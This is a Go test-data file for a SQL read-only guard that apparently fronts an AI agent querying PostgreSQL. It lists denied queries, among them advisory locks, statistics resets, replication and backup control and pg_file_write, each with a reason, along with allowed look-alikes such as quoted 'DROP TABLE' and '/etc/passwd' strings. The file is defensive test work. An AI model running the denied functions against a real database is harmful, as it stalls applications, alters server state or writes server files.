	{`SELECT schema_to_xmlschema('app', true, false, '')`, "schema_to_xmlschema"},
	// [policy] schema_to_xml* family.
	{`SELECT schema_to_xml_and_xmlschema('app', true, false, '')`, "schema_to_xml_and_xmlschema"},
	// [policy] ts_rewrite(query, select text) runs the select, like ts_stat.
	{`SELECT ts_rewrite('a & b'::tsquery, 'SELECT target, substitute FROM app.aliases')`, "ts_rewrite"},
	// [policy] tablefunc's crosstab runs its SQL string.
	{`SELECT * FROM crosstab('SELECT 1, 2, 3') AS ct(a int, b int)`, "crosstab"},
	// [policy] tablefunc's connectby builds SQL from its text arguments.
	{`SELECT * FROM connectby('app.tree', 'id', 'parent_id', '1', 0) AS t(id int, parent_id int, level int)`, "connectby"},

	// --- Denied functions: locks the application waits on ---

	// [review] A transaction lock on the application's own key, read from
	// pg_locks and held until statement_timeout, stalls its job queue.
	{`SELECT pg_try_advisory_xact_lock(classid::int, objid::int), pg_sleep(29) FROM pg_locks WHERE locktype = 'advisory'`, "pg_try_advisory_xact_lock"},
	// [review] The blocking transaction lock.
	{`SELECT pg_advisory_xact_lock(42)`, "pg_advisory_xact_lock"},
	// [review] Its shared variant.
	{`SELECT pg_advisory_xact_lock_shared(1, 2)`, "pg_advisory_xact_lock_shared"},
	// [review] The non-blocking shared variant.
	{`SELECT pg_try_advisory_xact_lock_shared(42)`, "pg_try_advisory_xact_lock_shared"},

	// --- Denied functions: state the rollback does not undo ---

	// [policy] A session advisory lock stays held on the pooled connection.
	{`SELECT pg_advisory_lock(42)`, "pg_advisory_lock"},
	// [policy] Shared session advisory lock.
	{`SELECT pg_advisory_lock_shared(42)`, "pg_advisory_lock_shared"},
	// [policy] The non-blocking variant.
	{`SELECT pg_try_advisory_lock(1, 2)`, "pg_try_advisory_lock"},
	// [policy] Its shared variant.
	{`SELECT pg_try_advisory_lock_shared(42)`, "pg_try_advisory_lock_shared"},
	// [policy] Called as a field.
	{`SELECT (42::bigint).pg_advisory_lock`, "function pg_advisory_lock"},
	// [policy] Statistics resets are not transactional.
	{`SELECT pg_stat_reset()`, "pg_stat_reset"},
	// [policy] Cluster-wide statistics.
	{`SELECT pg_stat_reset_shared('bgwriter')`, "pg_stat_reset_shared"},
	// [policy] pg_stat_statements.
	{`SELECT pg_stat_statements_reset()`, "pg_stat_statements_reset"},
	// [policy] Copies a replication slot, which outlives the transaction.
	{`SELECT pg_copy_physical_replication_slot('a', 'b')`, "pg_copy_physical_replication_slot"},
	// [policy] Creates slots on a standby (PostgreSQL 17).
	{`SELECT pg_sync_replication_slots()`, "pg_sync_replication_slots"},
	// [policy] Pauses replay on a standby.
	{`SELECT pg_wal_replay_pause()`, "pg_wal_replay_pause"},
	// [policy] Backup control before PostgreSQL 15.
	{`SELECT pg_start_backup('b')`, "pg_start_backup"},
	// [policy] Backup control before PostgreSQL 15.
	{`SELECT pg_stop_backup()`, "pg_stop_backup"},
	// [policy] adminpack writes server files (before PostgreSQL 17).
	{`SELECT pg_file_write('x', 'y', false)`, "pg_file_write"},
	// [policy] Server directory listings.
	{`SELECT * FROM pg_ls_waldir()`, "pg_ls_waldir"},
}

// Allowed is SQL the guard must accept: what an agent reading a database
// writes, and look-alikes of the rejected cases.
var Allowed = []string{
	// Plain and complex SELECTs.
	`SELECT 1`,
	`select 1;`,
	"  SELECT 1 ;\n",
	`SELECT id, status, total FROM app.orders WHERE status = 'pending' AND total > 10 ORDER BY placed_at DESC LIMIT 20 OFFSET 40`,
	`SELECT c.name, count(o.id) AS orders, sum(o.total)::numeric(12,2) AS spent
	   FROM app.customers c LEFT JOIN app.orders o ON o.customer_id = c.id
	  WHERE c.active AND c.signup_date >= date '2024-01-01'
	  GROUP BY c.name HAVING count(o.id) > 1 ORDER BY spent DESC NULLS LAST`,
	`SELECT * FROM app.orders o WHERE EXISTS (SELECT 1 FROM app.customers c WHERE c.id = o.customer_id AND c.tags @> ARRAY['tier1'])`,
	`SELECT DISTINCT ON (customer_id) customer_id, placed_at FROM app.orders ORDER BY customer_id, placed_at DESC`,
	`SELECT status, count(*) FROM app.orders GROUP BY ROLLUP (status)`,
	`SELECT * FROM app.orders FETCH FIRST 5 ROWS ONLY`,
	`SELECT * FROM app.events TABLESAMPLE SYSTEM (1) REPEATABLE (42)`,
	`SELECT id FROM app.orders WHERE customer_id = $1 AND status = ANY($2::app.order_status[])`,
	`SELECT * FROM generate_series(1, 3) AS g(n)`,
	// WITH queries: recursive, materialized, SEARCH and CYCLE.
	`WITH recent AS MATERIALIZED (SELECT * FROM app.orders WHERE placed_at > now() - interval '7 days') SELECT status, count(*) FROM recent GROUP BY status`,
	`WITH RECURSIVE n(i) AS (VALUES (1) UNION ALL SELECT i + 1 FROM n WHERE i < 10) SELECT sum(i) FROM n`,
	`WITH RECURSIVE t(id, parent) AS (SELECT 1, NULL::int UNION ALL SELECT id + 1, id FROM t WHERE id < 3)
	 SEARCH DEPTH FIRST BY id SET ord CYCLE id SET is_cycle USING path SELECT * FROM t`,
	// Window functions and aggregates.
	`SELECT id, row_number() OVER (PARTITION BY customer_id ORDER BY placed_at), sum(total) OVER w
	   FROM app.orders WINDOW w AS (ORDER BY id ROWS BETWEEN 2 PRECEDING AND CURRENT ROW)`,
	`SELECT string_agg(name, ', ' ORDER BY name) FILTER (WHERE active) FROM app.customers`,
	// LATERAL.
	`SELECT c.name, o.total FROM app.customers c CROSS JOIN LATERAL (SELECT total FROM app.orders WHERE customer_id = c.id ORDER BY placed_at DESC LIMIT 3) o`,
	`SELECT e.id, item FROM app.events e, LATERAL jsonb_array_elements(e.payload->'items') AS item`,
	// JSON operators and SQL/JSON.
	`SELECT payload->>'kind', payload #> '{a,b}', payload @> '{"x":1}', payload ? 'kind', jsonb_path_query(payload, '$.items[*] ? (@.qty > 1)') FROM app.events`,
	`SELECT jt.* FROM app.events, JSON_TABLE(payload, '$.items[*]' COLUMNS (sku text PATH '$.sku', qty int PATH '$.qty')) AS jt`,
	`SELECT JSON_OBJECT('id': id, 'kind': kind) FROM app.events WHERE payload IS JSON OBJECT`,
	// EXPLAIN, with and without ANALYZE.
	`EXPLAIN SELECT * FROM app.orders WHERE status = 'pending'`,
	`EXPLAIN ANALYZE SELECT count(*) FROM app.events`,
	`EXPLAIN (ANALYZE, BUFFERS, VERBOSE, FORMAT JSON) WITH x AS (SELECT 1) SELECT * FROM x`,
	`EXPLAIN (GENERIC_PLAN) SELECT * FROM app.orders WHERE id = $1`,
	// SHOW.
	`SHOW search_path`,
	`SHOW ALL`,
	`SHOW TRANSACTION ISOLATION LEVEL`,
	// VALUES, TABLE and set operations.
	`VALUES (1, 'a'), (2, 'b') ORDER BY 1`,
	`TABLE app.orders`,
	`SELECT id FROM app.orders UNION ALL SELECT id FROM app.events`,
	`(SELECT 1) INTERSECT (SELECT 1) EXCEPT SELECT 2`,
	// DROP, SET and ";" inside literals, comments and quoted identifiers.
	`SELECT 'DROP TABLE app.orders; --' AS note`,
	`SELECT 'SET statement_timeout = 0; COMMIT'`,
	`SELECT 'pg_read_file(''/etc/passwd'')' AS not_a_call`,
	`SELECT 1 -- ; DROP TABLE app.orders`,
	`SELECT 1 /* ; DELETE FROM app.orders */`,
	`SELECT 1 /* outer /* inner */ ; DROP TABLE app.orders; */`,
	`SELECT $$; DROP TABLE app.orders; $$`,
	`SELECT $a$ $b$; DROP TABLE app.orders; $b$ $a$`,
	`SELECT E'it\'s; DROP TABLE app.orders'`,
	`SELECT U&'\0044ROP TABLE app.orders\003B'`,
	`SELECT 1 AS "x; DROP TABLE app.orders"`,
	// Field selections and qualified columns.
	`SELECT (o).id, (o).status FROM app.orders o`,
	`SELECT (t.c).f1 FROM (SELECT ROW(1, 2) AS c) t`,
	`SELECT app.orders.id, o2.total FROM app.orders, app.orders AS o2`,
	`SELECT q.price_lo FROM app.quotes q`,
	// Look-alikes of denied functions.
	`SELECT lower(name), log(2, 8) FROM app.customers`,
	`SELECT netmask(last_ip) FROM app.customers`,
	`SELECT set_byte('\x00'::bytea, 0, 1), current_setting('statement_timeout')`,
	`SELECT to_tsvector('english', message) FROM app.audit_log`,
	`SELECT xmlelement(name total, sum(total)), xpath('/a/text()', '<a>1</a>'::xml) FROM app.orders`,
	`SELECT pg_size_pretty(pg_total_relation_size('app.orders')), pg_backend_pid()`,
	`SELECT n.nspname FROM pg_catalog.pg_namespace n`,
	`SELECT pg_advisory_unlock(44), pg_advisory_unlock_shared(45), pg_advisory_unlock_all()`,
	// These read the transaction id only if one was taken, or the snapshot.
	`SELECT pg_current_xact_id_if_assigned(), txid_current_if_assigned(), pg_current_snapshot(), txid_current_snapshot()`,
	`SELECT relname, seq_scan FROM pg_stat_user_tables`,
	`SELECT pg_is_wal_replay_paused(), pg_lsn('0/16B3748'), name FROM pg_settings`,
	// pg_settings (current GUC values, like SHOW) stays allowed; only the
	// views that return raw config-file contents are denied.
	`SELECT name, setting, unit FROM pg_settings WHERE name = 'statement_timeout'`,
	// Function prefixes do not apply to relations: pg_replication_ is denied
	// as a function prefix only.
	`SELECT slot_name, active FROM pg_replication_slots`,
	// Views that mask passwords, and subscription status without conninfo.
	`SELECT rolname, rolsuper, rolpassword FROM pg_roles`,
	`SELECT usename, passwd FROM pg_catalog.pg_user`,
	`SELECT subname, pid FROM pg_stat_subscription`,
	`SELECT net.id FROM app.events AS net`,
	`SELECT "dblink" FROM (SELECT 1 AS "dblink") s`,
	`SELECT 'São Paulo' AS cidade`,
}
